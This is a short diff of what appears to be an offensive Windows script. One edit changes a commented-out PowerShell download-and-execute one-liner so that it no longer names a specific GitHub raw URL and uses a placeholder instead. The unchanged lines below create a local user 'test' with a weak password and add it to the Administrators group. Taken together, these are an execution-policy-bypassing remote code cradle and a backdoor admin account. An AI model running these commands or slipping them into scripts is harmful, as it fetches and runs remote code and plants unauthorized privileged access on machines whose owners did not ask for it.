@@ -1,4 +1,4 @@
-# powershell.exe -nop -exec bypass -c "iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pswalia2u/test/refs/heads/main/conf.ps1'))"
+# powershell.exe -nop -exec bypass -c "iex((New-Object Net.WebClient).DownloadString('script-URL'))"
 #Adding Local Admin User
 net user /add test admin123
 net localgroup "Administrators" test /add
